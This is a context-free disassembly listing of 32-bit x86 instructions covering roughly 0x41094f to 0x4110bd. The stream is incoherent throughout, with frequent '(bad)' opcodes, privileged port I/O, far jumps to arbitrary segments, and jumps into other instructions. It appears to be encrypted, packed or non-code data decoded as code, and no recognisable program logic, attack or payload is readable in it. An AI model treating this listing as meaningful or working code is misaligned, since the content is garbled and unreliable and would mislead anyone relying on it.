  41094f:	xor    al,0x75
  410951:	dec    ebp
  410952:	out    0x6,al
  410954:	mov    esp,0xaedc1294
  410959:	pusha  
  41095a:	repz jne 0x4108fe
  41095d:	mov    ecx,0x760794f0
  410962:	cdq    
  410963:	(bad)  
  410964:	jae    0x4108ed
  410966:	jmp    0xae9fbfb3
  41096b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41096c:	and    ch,BYTE PTR [ebp+0x2348a06c]
  410972:	adc    al,BYTE PTR [eax-0x4c]
  410975:	cli    
  410976:	dec    edi
  410977:	xchg   ebx,eax
  410978:	fidiv  WORD PTR [ecx]
  41097a:	mov    dh,0xca
  41097c:	sub    al,0x73
  41097e:	xlat   BYTE PTR ds:[ebx]
  41097f:	and    edx,DWORD PTR [ebp-0x23]
  410982:	mov    dh,bl
  410984:	mov    eax,ds:0xbb32f799
  410989:	or     bh,BYTE PTR [ebp-0x6e]
  41098c:	icebp  
  41098d:	and    DWORD PTR [edi+0x69f9f888],edi
  410993:	aaa    
  410994:	sbb    ebp,DWORD PTR [esi+eiz*1+0x553b79a0]
  41099b:	xchg   edi,eax
  41099c:	mov    ah,0x34
  41099e:	sbb    dl,BYTE PTR [edx+0x104b6d0e]
  4109a4:	test   al,0x35
  4109a6:	jno    0x410946
  4109a8:	and    ah,BYTE PTR [esi+0x20]
  4109ab:	out    0x3f,al
  4109ad:	dec    esi
  4109ae:	sbb    BYTE PTR [ebx],cl
  4109b0:	jle    0x410a2b
  4109b2:	jge    0x410a1d
  4109b4:	mov    ch,0x3a
  4109b6:	pop    ebp
  4109b7:	hlt    
  4109b8:	xchg   ebx,eax
  4109b9:	cmp    ah,BYTE PTR [ebp+0x4b67d2a7]
  4109bf:	pop    ecx
  4109c0:	jmp    0x4109d6
  4109c2:	inc    ecx
  4109c3:	es pop ebp
  4109c5:	jge    0x410976
  4109c7:	jbe    0x41099c
  4109c9:	inc    esi
  4109ca:	stos   DWORD PTR es:[edi],eax
  4109cb:	ins    DWORD PTR es:[edi],dx
  4109cc:	fidiv  DWORD PTR [ecx]
  4109ce:	jb     0x4109a9
  4109d0:	jecxz  0x4109a7
  4109d2:	or     BYTE PTR [ebp-0x3c0ce04d],0xb6
  4109d9:	push   0x38
  4109db:	xlat   BYTE PTR ds:[ebx]
  4109dc:	arpl   si,sp
  4109de:	sub    DWORD PTR [ebx+0xa],ebx
  4109e1:	je     0x410a52
  4109e3:	cld    
  4109e4:	enter  0x47c8,0x86
  4109e8:	outs   dx,DWORD PTR ds:[esi]
  4109e9:	xor    al,0xc6
  4109eb:	arpl   WORD PTR [edi+eax*4],bp
  4109ee:	cs cmp al,0xa0
  4109f1:	mov    eax,ds:0x431f46fd
  4109f6:	mov    ebp,0xcfa785b1
  4109fb:	lds    eax,FWORD PTR [esi]
  4109fd:	sub    DWORD PTR [edi+0x40],ecx
  410a00:	xchg   DWORD PTR [esi+0x58cd404e],edi
  410a06:	ret    0x4b1b
  410a09:	inc    ebp
  410a0a:	in     eax,dx
  410a0b:	pop    ebp
  410a0c:	cmp    al,0x4d
  410a0e:	push   edi
  410a0f:	xor    eax,0xed36a79
  410a14:	(bad)  
  410a15:	pusha  
  410a16:	in     al,0x64
  410a18:	jle    0x4109e2
  410a1a:	out    dx,eax
  410a1b:	js     0x4109f6
  410a1d:	pop    ss
  410a1e:	pushf  
  410a1f:	outs   dx,DWORD PTR ds:[esi]
  410a20:	fiadd  DWORD PTR [ebx-0x7f0990bf]
  410a26:	jmp    0x39b4:0xe944efee
  410a2d:	push   ecx
  410a2e:	mov    eax,ds:0xc61c100f
  410a33:	push   ebp
  410a34:	mov    ds:0x146a5342,al
  410a39:	jno    0x4109be
  410a3b:	das    
  410a3c:	jl     0x410a84
  410a3e:	push   0x2e56083b
  410a43:	mov    bh,0x34
  410a45:	jle    0x410a58
  410a47:	je     0x410a5f
  410a49:	clc    
  410a4a:	xchg   edx,eax
  410a4b:	push   esi
  410a4c:	(bad)  [eax]
  410a4e:	(bad)  
  410a4f:	mov    ebx,0xa12d1712
  410a54:	jb     0x410a30
  410a56:	(bad)  
  410a57:	pop    ebx
  410a58:	icebp  
  410a59:	fadd   DWORD PTR [ecx-0x7c]
  410a5c:	sub    eax,0x3ca4c4c1
  410a61:	gs sbb eax,0x46f7f0c5
  410a67:	cmc    
  410a68:	jecxz  0x410a65
  410a6a:	inc    ebx
  410a6b:	mov    bl,0x58
  410a6d:	cli    
  410a6e:	jg     0x410ad1
  410a70:	popf   
  410a71:	(bad)  
  410a72:	outs   dx,BYTE PTR ds:[esi]
  410a73:	lea    esp,[eax+edx*2-0x3bb1116]
  410a7a:	inc    eax
  410a7b:	inc    eax
  410a7c:	(bad)  
  410a7d:	jmp    0xedf142fe
  410a82:	mov    ch,0xe
  410a84:	and    al,0x6
  410a86:	inc    ecx
  410a88:	push   ss
  410a89:	push   ss
  410a8a:	xlat   BYTE PTR ds:[ebx]
  410a8b:	mov    cl,0xb2
  410a8d:	adc    eax,DWORD PTR [ebx]
  410a8f:	ja     0x410a33
  410a91:	lahf   
  410a92:	(bad)  
  410a94:	arpl   WORD PTR [edx+0x198c3c6a],ax
  410a9a:	dec    esp
  410a9b:	cmp    eax,0xf6cab7ce
  410aa0:	rep outs dx,DWORD PTR ds:[esi]
  410aa2:	sub    BYTE PTR [edi+0x2a],ah
  410aa5:	rcl    BYTE PTR [ecx+0x419d5936],1
  410aab:	fisub  DWORD PTR [edx]
  410aad:	out    dx,eax
  410aae:	pushf  
  410aaf:	retf   
  410ab0:	ins    BYTE PTR es:[edi],dx
  410ab1:	mov    esp,0x685b6acf
  410ab6:	sahf   
  410ab7:	xor    DWORD PTR [esi],edi
  410ab9:	aaa    
  410aba:	addr16 adc al,0x1b
  410abd:	lahf   
  410abe:	jmp    0x2aab:0xe424bd70
  410ac5:	aam    0x52
  410ac7:	test   esi,esi
  410ac9:	jnp    0x410a68
  410acb:	shl    dh,1
  410acd:	mov    ebx,0x425e589f
  410ad2:	rcl    bh,cl
  410ad4:	fiadd  WORD PTR [esi]
  410ad6:	cdq    
  410ad7:	inc    eax
  410ad8:	add    DWORD PTR [eax+0x5b],0x985b3f12
  410adf:	adc    edx,DWORD PTR [edi+0x6e7b4710]
  410ae5:	aad    0xa3
  410ae7:	mov    esi,0xcc39cc0f
  410aec:	mov    ah,0xe6
  410aee:	cmc    
  410aef:	add    BYTE PTR [ebp-0x72],cl
  410af2:	sub    al,BYTE PTR [ebx]
  410af4:	jl     0x410aa1
  410af6:	jae    0x410a96
  410af8:	mov    eax,0xcf8112a
  410afd:	push   es
  410afe:	pop    esi
  410aff:	clc    
  410b00:	and    eax,0x3ff63ba6
  410b05:	xchg   esp,eax
  410b06:	mov    dh,0xe4
  410b08:	pushf  
  410b09:	test   DWORD PTR [eax+ebp*2+0x25],ebx
  410b0d:	aam    0xe4
  410b0f:	hlt    
  410b10:	mov    dl,0x97
  410b12:	mov    ds:0x314d013e,al
  410b17:	fsub   DWORD PTR [ebp+0x6f]
  410b1a:	icebp  
  410b1b:	scas   al,BYTE PTR es:[edi]
  410b1c:	push   eax
  410b1d:	sahf   
  410b1e:	imul   esp,DWORD PTR [esi],0x23
  410b21:	inc    esp
  410b22:	cmp    cl,BYTE PTR [eax+ebp*1]
  410b25:	pop    edx
  410b26:	cwde   
  410b27:	adc    edx,DWORD PTR ds:0x729f702d
  410b2d:	mov    WORD PTR [edi],cs
  410b2f:	mov    edi,0xdaac3c3a
  410b34:	loop   0x410b3e
  410b36:	int3   
  410b37:	push   eax
  410b38:	gs push 0xb3c3475
  410b3e:	mov    ah,0x51
  410b40:	xchg   ebp,eax
  410b41:	or     al,BYTE PTR [eax-0x70f989f8]
  410b47:	push   esi
  410b48:	or     eax,0x6ec683fb
  410b4d:	and    BYTE PTR [edx],dl
  410b4f:	out    0xe,eax
  410b51:	or     eax,0xe5692953
  410b56:	xor    DWORD PTR [edi-0xedcdf2],esi
  410b5c:	leave  
  410b5d:	jno    0x410bb8
  410b5f:	in     al,0x52
  410b61:	mov    edx,0xa1cc0ca7
  410b66:	sbb    ebx,DWORD PTR [edx+0x366d50e7]
  410b6c:	dec    esp
  410b6d:	cmp    esi,esp
  410b6f:	(bad)  
  410b70:	repnz test DWORD PTR [eax+0x31],edx
  410b74:	ret    0xc7a6
  410b77:	xor    eax,0xb8b2096a
  410b7c:	out    0x44,eax
  410b7e:	fbstp  TBYTE PTR [ecx]
  410b80:	std    
  410b81:	pop    ebp
  410b82:	into   
  410b83:	xlat   BYTE PTR ds:[ebx]
  410b84:	(bad)  
  410b85:	mov    ah,0x6c
  410b87:	aas    
  410b88:	call   0xed25:0x9ce77eed
  410b8f:	xlat   BYTE PTR ds:[ebx]
  410b90:	ror    ah,1
  410b92:	push   0x75
  410b94:	jge    0x410bc6
  410b96:	cmp    esp,esp
  410b98:	push   ecx
  410b99:	xor    DWORD PTR [eax-0xcaf9f5a],0xfffffff9
  410ba0:	sbb    ah,BYTE PTR [edx]
  410ba2:	fwait
  410ba3:	punpckhdq mm4,mm4
  410ba6:	adc    ebx,DWORD PTR [edx+0x3a9df9f]
  410bac:	inc    edi
  410bad:	mov    ds:0x750fa4d1,al
  410bb2:	stos   DWORD PTR es:[edi],eax
  410bb3:	rcr    BYTE PTR [ebx],0x1a
  410bb6:	cs pop ds
  410bb8:	inc    ebp
  410bb9:	cmp    eax,0x63959f8f
  410bbe:	gs xchg ecx,eax
  410bc0:	mov    esi,DWORD PTR [ebx+esi*4-0x6]
  410bc4:	add    al,0x90
  410bc6:	pop    edx
  410bc7:	push   esp
  410bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bc9:	std    
  410bca:	inc    eax
  410bcb:	in     al,dx
  410bcc:	pop    esp
  410bcd:	jle    0x410c22
  410bcf:	les    ebx,FWORD PTR [eax+ebx*1-0x3]
  410bd3:	jns    0x410c29
  410bd5:	out    dx,al
  410bd6:	and    al,0x54
  410bd8:	xchg   DWORD PTR [esi],ebp
  410bda:	pop    eax
  410bdb:	push   edi
  410bdc:	ins    DWORD PTR es:[edi],dx
  410bdd:	sub    cl,bh
  410bdf:	sbb    al,0x6a
  410be1:	add    BYTE PTR [edx],dl
  410be3:	jns    0x410c4a
  410be5:	cmp    al,0x1c
  410be7:	aad    0xc3
  410be9:	sub    edi,DWORD PTR [edi+0x40]
  410bec:	mov    cs,WORD PTR [esi+edi*8+0x6e]
  410bf0:	sub    bh,dh
  410bf2:	lahf   
  410bf3:	push   eax
  410bf4:	adc    ebx,DWORD PTR cs:[edi]
  410bf7:	sbb    ebx,ecx
  410bf9:	dec    esi
  410bfa:	data16 lahf 
  410bfc:	cmp    al,0x3
  410bfe:	loop   0x410c68
  410c00:	int3   
  410c01:	daa    
  410c02:	(bad)  
  410c03:	xlat   BYTE PTR ds:[ebx]
  410c04:	cmp    al,0x84
  410c06:	add    cl,bh
  410c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c09:	dec    eax
  410c0a:	and    edi,DWORD PTR [edi+0x75e0d31c]
  410c10:	repz xor DWORD PTR fs:[edx+0x75150e7d],0x305bf632
  410c1c:	xor    DWORD PTR [esi+0x10],esp
  410c1f:	fidivr WORD PTR [ebx+0xa82b898]
  410c25:	dec    eax
  410c26:	rcr    DWORD PTR es:[esi+0x36],1
  410c2a:	popa   
  410c2b:	sbb    BYTE PTR [ebp+0x61b022ef],ch
  410c31:	ins    DWORD PTR es:[edi],dx
  410c32:	xchg   esi,eax
  410c33:	(bad)
  410c36:	adc    BYTE PTR [ebp+0x2],dl
  410c39:	ins    BYTE PTR es:[edi],dx
  410c3a:	inc    eax
  410c3b:	nop
  410c3c:	cmp    bh,BYTE PTR [esi-0x6ec35e74]
  410c42:	arpl   WORD PTR [esi],dx
  410c44:	pop    es
  410c45:	jnp    0x410c31
  410c47:	cld    
  410c48:	addr16 xchg ebp,eax
  410c4a:	add    al,0x6f
  410c4c:	cmp    ecx,DWORD PTR [edx+0xe]
  410c4f:	and    eax,0x9a4e380
  410c54:	xor    ecx,DWORD PTR [esi+0x3e335d9c]
  410c5a:	pop    ecx
  410c5b:	sbb    BYTE PTR [eax+ebp*2+0x80ebff9],ah
  410c62:	inc    ecx
  410c63:	xor    DWORD PTR [edx-0x31],ecx
  410c66:	push   cs
  410c67:	stc    
  410c68:	sub    eax,0xd0fff2b2
  410c6d:	sar    BYTE PTR [edi+0x66ef344c],0x86
  410c74:	xor    al,0x3d
  410c76:	hlt    
  410c77:	test   DWORD PTR [ecx],eax
  410c79:	pushf  
  410c7a:	dec    edx
  410c7b:	pop    eax
  410c7c:	mov    cl,0xe3
  410c7e:	sub    BYTE PTR [edi-0x6d700ee2],ch
  410c84:	jnp    0x410ced
  410c86:	push   esi
  410c87:	mov    ebp,0xd9de64b4
  410c8c:	add    eax,0xf6e90fa9
  410c91:	add    BYTE PTR [eax+0x5c374695],ah
  410c97:	(bad)  
  410c98:	(bad)  
  410c99:	out    dx,eax
  410c9a:	push   ecx
  410c9b:	popf   
  410c9c:	ds xor al,0xfd
  410c9f:	sbb    ah,BYTE PTR [edx]
  410ca1:	inc    esi
  410ca2:	in     al,0x3f
  410ca4:	stc    
  410ca5:	sbb    ebx,DWORD PTR [ebp-0x677e791f]
  410cab:	div    DWORD PTR [edx+0x6]
  410cae:	push   eax
  410caf:	mov    ebx,0x6bd070af
  410cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cb5:	push   esi
  410cb6:	mov    es,WORD PTR [edx+0x637ca70]
  410cbc:	sub    bh,bl
  410cbe:	(bad)  
  410cbf:	repnz pop es
  410cc1:	icebp  
  410cc2:	xchg   BYTE PTR [edi],ch
  410cc4:	ja     0x410c49
  410cc6:	xchg   ebx,eax
  410cc7:	push   ss
  410cc8:	jle    0x410cf4
  410cca:	xchg   esi,eax
  410ccb:	into   
  410ccc:	scas   al,BYTE PTR es:[edi]
  410ccd:	lods   al,BYTE PTR ds:[esi]
  410cce:	out    0x7,al
  410cd0:	adc    eax,0xcb95c021
  410cd5:	mov    dl,0xe5
  410cd7:	push   0x9cf004e6
  410cdc:	outs   dx,BYTE PTR es:[esi]
  410cde:	mov    BYTE PTR [ebp-0x4255cc40],ah
  410ce4:	mov    bh,0x84
  410ce6:	mov    eax,0x4c07fca1
  410ceb:	mov    ds:0x36a49a69,eax
  410cf0:	sub    DWORD PTR [edx-0x3be63b60],ebx
  410cf6:	mov    bh,0x30
  410cf8:	add    al,0x6f
  410cfa:	xchg   edi,eax
  410cfb:	xor    al,0x30
  410cfd:	sbb    dh,dl
  410cff:	inc    edi
  410d00:	lods   eax,DWORD PTR ds:[esi]
  410d01:	xor    esi,DWORD PTR [ecx]
  410d03:	add    al,0x2f
  410d05:	cmp    eax,0xc45611c6
  410d0a:	adc    al,0x3c
  410d0c:	out    dx,al
  410d0d:	adc    ch,0xb8
  410d10:	sbb    DWORD PTR ds:0xfb086087,ebp
  410d16:	xor    DWORD PTR [ebp+0x21],0xb0777388
  410d1d:	nop
  410d1e:	or     ecx,ecx
  410d20:	stos   DWORD PTR es:[edi],eax
  410d21:	pop    esp
  410d22:	ins    BYTE PTR es:[edi],dx
  410d23:	imul   eax,ebp,0xffffffdd
  410d26:	(bad)  [edx]
  410d28:	mov    dh,0x33
  410d2a:	dec    esp
  410d2b:	cmp    eax,0x6b26e9de
  410d30:	imul   esp,DWORD PTR [esi-0x473df2d8],0x7d
  410d37:	adc    ebp,ebx
  410d39:	push   ecx
  410d3a:	mov    eax,0xc07823e
  410d3f:	(bad)
  410d43:	ja     0x410d05
  410d45:	jb     0x410cce
  410d47:	sub    cl,BYTE PTR [edi+0x44122629]
  410d4d:	je     0x410d3e
  410d4f:	lock jmp 0xdffc10a
  410d55:	xor    edi,ecx
  410d57:	iret   
  410d58:	push   cs
  410d59:	xchg   DWORD PTR [edx],ebp
  410d5b:	stos   BYTE PTR es:[edi],al
  410d5c:	ins    BYTE PTR es:[edi],dx
  410d5d:	xor    edx,DWORD PTR [eax-0x38]
  410d60:	sbb    al,0x26
  410d62:	inc    esp
  410d63:	jnp    0x410dab
  410d65:	sbb    ah,BYTE PTR [eax+0x4f834e34]
  410d6b:	pop    ecx
  410d6c:	inc    ebx
  410d6d:	mov    al,0xa
  410d6f:	iret   
  410d70:	dec    edi
  410d71:	xor    esi,DWORD PTR [edi]
  410d73:	inc    ecx
  410d74:	or     esp,esi
  410d76:	sbb    al,0x92
  410d78:	push   ecx
  410d79:	xor    ebx,DWORD PTR [edx+0x6707069e]
  410d7f:	push   es
  410d80:	fiadd  DWORD PTR [edi-0x66]
  410d83:	cmp    bl,bl
  410d85:	in     al,dx
  410d86:	rol    BYTE PTR [ecx],1
  410d88:	(bad)  
  410d8a:	hlt    
  410d8b:	rcr    DWORD PTR [ecx+ecx*2-0x51],1
  410d8f:	ficom  WORD PTR [ebp-0x1691394f]
  410d95:	sub    al,0xd6
  410d97:	fisub  WORD PTR [ecx]
  410d99:	je     0x410da7
  410d9b:	aaa    
  410d9c:	leave  
  410d9d:	sahf   
  410d9e:	add    al,cl
  410da0:	imul   edx,DWORD PTR [edx-0x6f],0x22
  410da4:	jmp    0x33630d2b
  410da9:	or     ecx,0x4adb76f
  410daf:	and    DWORD PTR [ebx],edi
  410db1:	repz or DWORD PTR [esi+0x1db3d9d8],ecx
  410db8:	fstp   DWORD PTR [ebp+0x77]
  410dbb:	push   es
  410dbc:	hlt    
  410dbd:	mov    ds:0x9e351c2b,eax
  410dc2:	cs pushf 
  410dc4:	enter  0xc478,0x64
  410dc8:	js     0x410e3d
  410dca:	out    dx,eax
  410dcb:	ins    DWORD PTR es:[edi],dx
  410dcc:	ins    DWORD PTR es:[edi],dx
  410dcd:	dec    DWORD PTR [ecx+0x5a8283bd]
  410dd3:	mov    ecx,esp
  410dd5:	xchg   ebx,eax
  410dd6:	mov    ebp,0xef765858
  410ddb:	mov    ebx,0x432fe724
  410de0:	std    
  410de1:	push   ss
  410de2:	mov    ds,WORD PTR [edx]
  410de4:	jns    0x410e13
  410de6:	adc    dl,dh
  410de8:	push   0x741d515f
  410ded:	jecxz  0x410e21
  410def:	lods   eax,DWORD PTR ds:[esi]
  410df0:	leave  
  410df1:	ins    DWORD PTR es:[edi],dx
  410df2:	inc    ebp
  410df3:	cmp    bl,BYTE PTR [ecx+edi*8+0x3e9b2030]
  410dfa:	add    eax,0x95296cd7
  410dff:	cmp    DWORD PTR [ecx],0x3265c1e6
  410e05:	xchg   ebx,eax
  410e06:	addr16 das 
  410e08:	fisubr WORD PTR [edi]
  410e0a:	ror    DWORD PTR ds:0x536d5328,1
  410e10:	pop    ebx
  410e11:	(bad)  
  410e12:	imul   eax,esi,0x4b
  410e15:	sbb    BYTE PTR [esi-0x6e2f948b],bl
  410e1b:	test   al,dh
  410e1d:	bound  esi,QWORD PTR [edi]
  410e1f:	shr    BYTE PTR [ecx-0x5c],0x92
  410e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e24:	lods   al,BYTE PTR ds:[esi]
  410e25:	call   0x4ca8:0x9749ab0b
  410e2c:	fs aas 
  410e2e:	xchg   ecx,eax
  410e2f:	xchg   esp,eax
  410e30:	cmp    eax,ecx
  410e32:	sub    BYTE PTR [eax+ecx*8+0x21],ah
  410e36:	xchg   edi,eax
  410e37:	push   esi
  410e38:	pusha  
  410e39:	pop    ds
  410e3a:	cmp    ebx,esi
  410e3c:	into   
  410e3d:	push   ecx
  410e3e:	pop    ss
  410e3f:	int3   
  410e40:	xor    DWORD PTR [edx],ecx
  410e42:	scas   eax,DWORD PTR es:[edi]
  410e43:	mov    ebp,0xcf7185ee
  410e48:	sub    bh,bl
  410e4a:	pop    ss
  410e4b:	pop    ebx
  410e4c:	in     al,0x55
  410e4e:	rol    BYTE PTR [esp+eax*2-0x25],cl
  410e52:	sbb    ebp,eax
  410e54:	(bad)  
  410e55:	sub    bh,al
  410e57:	xlat   BYTE PTR ds:[ebx]
  410e58:	outs   dx,BYTE PTR ds:[esi]
  410e59:	std    
  410e5a:	mov    WORD PTR [ecx+0x4b],cs
  410e5d:	sub    esi,ebp
  410e5f:	in     eax,0xb8
  410e61:	xchg   ecx,eax
  410e62:	aas    
  410e63:	xor    BYTE PTR [ecx],al
  410e65:	inc    esi
  410e66:	mov    ecx,0x75bf1cc2
  410e6b:	jo     0x410ee7
  410e6d:	dec    esp
  410e6e:	mov    al,0x36
  410e70:	daa    
  410e71:	inc    ecx
  410e72:	or     eax,0xd3f42db1
  410e77:	push   es
  410e78:	(bad)  
  410e79:	lock add al,0xe0
  410e7c:	(bad)  [eax]
  410e7e:	je     0x410eac
  410e80:	push   es
  410e81:	(bad)  
  410e82:	pop    ss
  410e83:	rcr    DWORD PTR [ecx+0x4c3e12fe],0x55
  410e8a:	sub    ah,BYTE PTR [edx+0x40]
  410e8d:	dec    eax
  410e8e:	(bad)  
  410e8f:	jge    0x410e45
  410e91:	mov    edi,DWORD PTR [edi]
  410e93:	sar    DWORD PTR [ecx],1
  410e95:	jp     0x410eda
  410e97:	mov    ds:0xdacb1e30,eax
  410e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e9d:	in     al,0x11
  410e9f:	adc    al,0x46
  410ea1:	and    ch,al
  410ea3:	push   ecx
  410ea4:	ret    
  410ea5:	dec    edi
  410ea6:	xor    eax,0x52059149
  410eab:	add    esi,DWORD PTR [edx]
  410ead:	mov    cl,0x5e
  410eaf:	mov    al,0x1d
  410eb1:	ins    BYTE PTR es:[edi],dx
  410eb2:	cdq    
  410eb3:	inc    ebx
  410eb4:	(bad)  
  410eb5:	adc    ch,0x5e
  410eb8:	cmc    
  410eb9:	dec    edi
  410eba:	xor    DWORD PTR [edi-0x40],eax
  410ebd:	mov    DWORD PTR [ebx*8-0x7268d121],ebp
  410ec4:	add    BYTE PTR [edx*8-0x7f558f5e],ah
  410ecb:	lahf   
  410ecc:	adc    ebx,esi
  410ece:	test   al,0x4b
  410ed0:	ds int 0x68
  410ed3:	gs xor esi,DWORD PTR es:[eax-0x42]
  410ed8:	shl    BYTE PTR ds:0x16d861a5,cl
  410ede:	add    eax,0x38e9cf1e
  410ee3:	outs   dx,DWORD PTR ds:[esi]
  410ee4:	sbb    eax,0xe3d6956e
  410ee9:	pop    eax
  410eea:	cli    
  410eeb:	loop   0x410f45
  410eed:	xchg   ecx,eax
  410eee:	clc    
  410eef:	add    eax,0xa23755bc
  410ef4:	push   esi
  410ef5:	xchg   esp,eax
  410ef6:	sahf   
  410ef7:	jmp    0x55af:0x822b41fc
  410efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eff:	sbb    ah,BYTE PTR [esi+0x5edb7e1f]
  410f05:	add    DWORD PTR [edx],esi
  410f07:	fldcw  WORD PTR [ecx+0x5276316f]
  410f0d:	sbb    BYTE PTR [ebx],0xd
  410f10:	outs   dx,BYTE PTR ds:[esi]
  410f11:	lds    ecx,FWORD PTR [ebx]
  410f13:	scas   al,BYTE PTR es:[edi]
  410f14:	push   cs
  410f15:	push   es
  410f16:	fbld   TBYTE PTR [esi-0x6f533e6f]
  410f1c:	sub    eax,0xab68462a
  410f21:	pop    ebx
  410f22:	test   eax,0xd878839c
  410f27:	fld    st(2)
  410f29:	push   es
  410f2a:	mov    ecx,0xcf053666
  410f2f:	mov    ah,BYTE PTR [edi]
  410f31:	hlt    
  410f32:	adc    esi,DWORD PTR [ecx]
  410f34:	paddq  mm5,QWORD PTR [edi]
  410f37:	call   0x303a:0x7df16ccf
  410f3e:	adc    al,0x91
  410f40:	pusha  
  410f41:	add    edi,DWORD PTR [ebx+0x6c]
  410f44:	pop    edx
  410f45:	push   ecx
  410f46:	xchg   esp,eax
  410f47:	popa   
  410f48:	sti    
  410f49:	push   esp
  410f4a:	bound  eax,QWORD PTR [esi+0x70e27469]
  410f50:	mov    bh,0x52
  410f52:	mov    esi,0x11e980ca
  410f57:	mov    esi,0x57d5d737
  410f5c:	or     DWORD PTR [ebp-0x16611127],0xfffffff9
  410f63:	leave  
  410f64:	push   ecx
  410f65:	cdq    
  410f66:	int3   
  410f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f68:	mov    WORD PTR [ebx-0x23],ds
  410f6b:	(bad)
  410f6f:	out    0xe5,eax
  410f71:	popf   
  410f72:	cmc    
  410f73:	lea    ebp,[esi+0x6930a52b]
  410f79:	xchg   ebx,eax
  410f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f7b:	stos   BYTE PTR es:[edi],al
  410f7c:	pop    esi
  410f7d:	or     dl,dh
  410f7f:	ins    DWORD PTR es:[edi],dx
  410f80:	mov    edi,0x25c593b8
  410f85:	stos   BYTE PTR es:[edi],al
  410f86:	shl    esp,cl
  410f88:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410f8a:	cmp    eax,0x8a08de
  410f8f:	xchg   edi,eax
  410f90:	lahf   
  410f91:	add    BYTE PTR [esi],ch
  410f93:	cmp    ebx,DWORD PTR [edi-0x1cac367c]
  410f99:	out    0xa5,eax
  410f9b:	xor    al,0x4f
  410f9d:	sti    
  410f9e:	dec    ebx
  410f9f:	sub    eax,0xed669ddf
  410fa4:	in     eax,dx
  410fa5:	test   al,0x3b
  410fa7:	(bad)  
  410fa8:	lock lods al,BYTE PTR ds:[esi]
  410faa:	scas   al,BYTE PTR es:[edi]
  410fab:	repz call 0x257c:0x2753f5c1
  410fb3:	jnp    0x410ffa
  410fb5:	xchg   ecx,eax
  410fb6:	leave  
  410fb7:	xchg   edi,eax
  410fb8:	mov    al,ds:0x6231c499
  410fbd:	dec    esi
  410fbe:	adc    al,BYTE PTR [eax-0x70]
  410fc1:	imul   edi,ebx,0x56
  410fc4:	hlt    
  410fc5:	jecxz  0x410fa7
  410fc7:	pop    edi
  410fc8:	leave  
  410fc9:	scas   al,BYTE PTR es:[edi]
  410fca:	pop    esp
  410fcb:	ins    BYTE PTR es:[edi],dx
  410fcc:	xchg   esp,eax
  410fcd:	in     eax,dx
  410fce:	jb     0x410f78
  410fd0:	sub    dh,BYTE PTR [eax+0xd533673]
  410fd6:	and    DWORD PTR [ebx-0x24],ebp
  410fd9:	xchg   ebx,eax
  410fda:	outs   dx,DWORD PTR ds:[esi]
  410fdb:	call   0x2a53797b
  410fe0:	popa   
  410fe1:	xor    DWORD PTR [ecx-0x4b1657c5],esp
  410fe7:	pushf  
  410fe8:	into   
  410fe9:	jnp    0x410fc1
  410feb:	mov    ?,WORD PTR [ebx+eiz*2]
  410fee:	stos   BYTE PTR es:[edi],al
  410fef:	add    eax,0x31336dd3
  410ff4:	out    dx,eax
  410ff5:	bound  edx,QWORD PTR [ebx-0x3edd0aa6]
  410ffb:	ins    BYTE PTR es:[edi],dx
  410ffc:	int3   
  410ffd:	outs   dx,BYTE PTR ds:[esi]
  410ffe:	fist   WORD PTR ds:0x160a6848
  411004:	lods   al,BYTE PTR ds:[esi]
  411005:	pop    esp
  411006:	add    BYTE PTR [esi+ebp*8],ah
  411009:	out    0xb1,eax
  41100b:	or     DWORD PTR ds:0x5f4e5924,0x4
  411012:	mov    ds:0xfc06cabd,eax
  411017:	lods   al,BYTE PTR ds:[esi]
  411018:	stc    
  411019:	jecxz  0x411083
  41101b:	sub    eax,0x3cc42f4f
  411020:	(bad)  
  411021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411022:	nop
  411023:	inc    ebx
  411024:	jbe    0x411007
  411026:	retf   0x71f4
  411029:	pop    ebx
  41102a:	ds out 0x60,al
  41102d:	fnsave [ecx-0x32]
  411030:	ja     0x4110a5
  411032:	popa   
  411033:	cmp    al,0x8
  411035:	and    dh,ch
  411037:	mov    ds:0xc4dbfd0b,eax
  41103c:	pop    ecx
  41103d:	mov    ebp,0xd5fb1b4a
  411042:	dec    ebp
  411043:	mul    BYTE PTR [eax-0x2dc1081e]
  411049:	jnp    0x411044
  41104b:	jl     0x4110a7
  41104d:	push   ebp
  41104e:	cmp    al,0x28
  411050:	add    al,0x45
  411052:	fsubr  st(3),st
  411054:	cmp    eax,0xbc61c3cf
  411059:	cmp    eax,0xb74db8b
  41105e:	sub    eax,0xd3216d4c
  411063:	pop    es
  411064:	cmp    ch,BYTE PTR [esi+ecx*4]
  411067:	sub    edx,DWORD PTR [ecx]
  411069:	mov    edi,0xf7483944
  41106e:	shl    edx,1
  411070:	out    0xc7,al
  411072:	test   DWORD PTR ds:0x6e8acedc,edi
  411078:	mov    bh,0x1d
  41107a:	ins    BYTE PTR es:[edi],dx
  41107b:	add    al,0x44
  41107d:	fcompp 
  41107f:	cld    
  411080:	outs   dx,DWORD PTR ds:[esi]
  411081:	cmc    
  411082:	hlt    
  411083:	je     0x411015
  411085:	test   DWORD PTR [edx],edx
  411087:	ins    DWORD PTR es:[edi],dx
  411088:	mov    edi,0x6c24d307
  41108d:	test   al,0x38
  41108f:	bound  edx,QWORD PTR [eax+0x8]
  411092:	inc    edi
  411093:	xlat   BYTE PTR ds:[ebx]
  411094:	and    ebp,DWORD PTR [edx-0x6e]
  411097:	xlat   BYTE PTR ds:[ebx]
  411098:	mov    al,ds:0x26de4ade
  41109d:	es push ss
  41109f:	cli    
  4110a0:	fld    TBYTE PTR [edx]
  4110a2:	leave  
  4110a3:	jmp    0x4110c4
  4110a5:	pop    ebx
  4110a6:	push   ds
  4110a7:	mov    ds:0x8b339674,eax
  4110ac:	jno    0x4110b4
  4110ae:	dec    edi
  4110af:	mov    WORD PTR [edx+ebx*4+0x554a94b6],gs
  4110b6:	jns    0x41107f
  4110b8:	fs enter 0x7d1e,0x50
  4110bd:	fadd   st(3),st
